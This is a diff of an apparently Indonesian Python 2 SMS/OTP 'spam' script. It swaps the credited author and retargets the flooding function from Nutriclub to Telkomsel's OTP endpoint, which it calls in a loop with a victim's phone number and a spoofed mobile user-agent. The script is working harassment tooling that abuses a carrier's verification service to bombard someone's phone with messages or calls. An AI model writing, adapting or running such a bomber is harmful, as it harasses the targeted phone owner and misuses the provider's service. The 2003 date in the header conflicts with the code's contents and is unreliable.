@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 # coding: UTF-8
-# coded by Tegar ID
+# coded by contoh
 # 15 january 2003 contoh
 # open source
 import requests, json, os, sys, random
@@ -20,7 +20,7 @@ def main():
   t = 1
   for spam in range(jum):
    t += 1
-   nutriclub()
+   telkomsel()
 
 def logo():
     print """\033[31;1m  _________                      _________        .__  .__
@@ -50,12 +50,12 @@ def input():
     jum = int(raw_input("%s* %sJumlah spam : "%(me,pu)))
     main()
 
-def nutriclub():
+def telkomsel():
   h = requests.post("https://www.my.telkomsel.com/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
   if json.loads(h.text)["StatusMessage"] == 'Request misscall berhasil':
-   sukses("✔","sms","nutriclub")
+   sukses("✔","sms","telkomsel")
   else:
-   gagal("✖","sms","nutriclub")
+   gagal("✖","sms","telkomsel")
 
 
 if __name__ == '__main__':
